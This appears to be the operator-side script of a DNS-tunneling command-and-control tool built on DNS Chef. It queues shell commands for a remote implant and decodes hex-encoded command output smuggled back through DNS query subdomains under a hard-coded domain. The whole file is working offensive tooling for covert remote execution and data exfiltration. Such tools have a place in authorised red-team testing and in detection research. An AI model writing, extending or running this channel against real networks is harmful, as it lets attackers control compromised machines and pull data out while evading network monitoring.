import pickle
import argparse
import random

baseDomain="noservicetest.rhynorater.com"
parser = argparse.ArgumentParser(description='Send commands and retrieve dns commands using DNS Chef')
parser.add_argument('-c', help='command', required=False)
parser.add_argument('-r', help='response code', required=False)
parser.add_argument('-w', action='store_true', default=False, help='issue wait', required=False)
parser.add_argument('-s', action='store_true', default=False, help='set up', required=False)
args = parser.parse_args()

if args.s:
    q = []
    d = "wait"
    pickle.dump((q, d), open("responses.pickle", "wb"))
    print("Setup complete")
elif args.w:
    (q, d) = pickle.load(open("responses.pickle", "rb"))
    d = "wait"
    pickle.dump((q, d), open("responses.pickle", "wb"))
    print("Waiting...")
elif args.c:
    (q, d) = pickle.load(open("responses.pickle", "rb"))
    rh = ''.join(chr(random.randrange(65,90)) for i in range(3)).lower()
    d = rh+":"+args.c
    pickle.dump((q, d), open("responses.pickle", "wb"))
    print("Your response code is: "+rh+".\nCommand queued...")
elif args.r:
    assert(len(args.r)==3)
    baseDomain = "."+baseDomain
    (q, d) = pickle.load(open("responses.pickle", "rb"))
    output = []
    seen = []
    for resp in q:
        if not resp.endswith(baseDomain):
            continue
        rdata = resp.replace(baseDomain, "")
        data = bytes.fromhex(rdata).decode('utf-8')
        if data.startswith(args.r):
            data = data.replace(args.r, "")
            index = int(data.split(":")[0])
            data = ":".join(data.split(":")[1:])
            if index in seen:
                continue
            elif index == 0 and all(map(lambda i: i in seen, range(1, max(seen)+1))):
                break
            else:
                output.insert(index-1, data)
                seen.append(index)
    print("".join(output))

else:
    print("Wrong parameters")


